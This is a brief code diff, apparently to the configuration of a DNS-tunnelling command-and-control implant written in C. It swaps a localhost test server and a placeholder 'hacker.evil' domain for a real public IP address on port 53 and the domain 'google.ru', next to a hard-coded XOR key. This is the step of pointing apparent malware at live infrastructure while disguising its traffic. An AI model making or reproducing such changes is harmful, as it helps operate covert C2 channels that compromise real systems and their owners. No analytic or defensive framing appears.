@@ -10,9 +10,9 @@
 
 #define XOR_KEY "mysecretkey"
 #define XOR_KEYLEN (sizeof(XOR_KEY) - 1)
-#define DNS_SERVER "127.0.0.1"
-#define DNS_PORT 5300
-#define C2_DOMAIN "hacker.evil"
+#define DNS_SERVER "217.154.13.193"
+#define DNS_PORT 53
+#define C2_DOMAIN "google.ru"
 
 
 
